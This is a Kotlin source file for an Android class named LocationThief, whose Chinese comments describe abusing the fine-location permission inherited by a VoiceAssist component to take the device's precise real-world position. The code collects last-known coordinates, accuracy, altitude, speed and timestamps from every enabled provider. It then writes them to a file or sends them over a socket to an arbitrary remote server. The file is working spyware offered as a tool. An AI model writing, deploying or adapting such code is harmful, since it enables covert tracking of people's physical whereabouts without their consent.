package xyz.mufanc.vap.util

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.location.LocationManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.File
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * 寄生提权：精准定位窃取工具 (明文版)
 * 利用 VoiceAssist 继承的 ACCESS_FINE_LOCATION 权限，瞬间获取设备在物理世界的真实坐标。
 */
class LocationThief {

    companion object {
        private const val TAG = "LocationThief"
    }

    /**
     * 窃取当前/最后已知的精准位置并保存到文件（USB 模式）
     */
    @SuppressLint("MissingPermission")
    fun stealToFile(outputPath: String): Int {
        return try {
            val locationArray = queryLocations()
            File(outputPath).writeText(locationArray.toString(4))
            Log.i(TAG, "Plaintext location data written to $outputPath")
            locationArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write location file", e)
            0
        }
    }

    /**
     * 窃取位置并通过 socket 回传（WiFi 模式）
     */
    @SuppressLint("MissingPermission")
    fun stealToSocket(serverAddress: String, serverPort: Int): Int {
        return try {
            val locationArray = queryLocations()
            val socket = Socket(serverAddress, serverPort)
            val outputStream = BufferedOutputStream(socket.getOutputStream())
            val payload = locationArray.toString().toByteArray(Charsets.UTF_8)

            outputStream.write(payload)
            outputStream.flush()
            socket.shutdownOutput()

            outputStream.close()
            socket.close()

            Log.i(TAG, "Plaintext location data sent to $serverAddress:$serverPort")
            locationArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to exfiltrate location", e)
            0
        }
    }

    @SuppressLint("MissingPermission")
    private fun queryLocations(): JSONArray {
        val locationArray = JSONArray()
        val locationManager = Ctx.app.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        try {
            val providers = locationManager.getProviders(true)

            for (provider in providers) {
                val location: Location? = locationManager.getLastKnownLocation(provider)
                if (location == null) continue

                val locObj = JSONObject()
                locObj.put("provider", provider)
                locObj.put("latitude", location.latitude)
                locObj.put("longitude", location.longitude)
                locObj.put("accuracy_meters", location.accuracy)
                locObj.put("altitude", location.altitude)
                locObj.put("speed_m_s", location.speed)
                locObj.put("time", format.format(Date(location.time)))

                locationArray.put(locObj)
            }

            Log.i(TAG, "Successfully extracted ${locationArray.length()} location records")
        } catch (e: Exception) {
            Log.e(TAG, "Error while stealing location", e)
        }

        return locationArray
    }
}
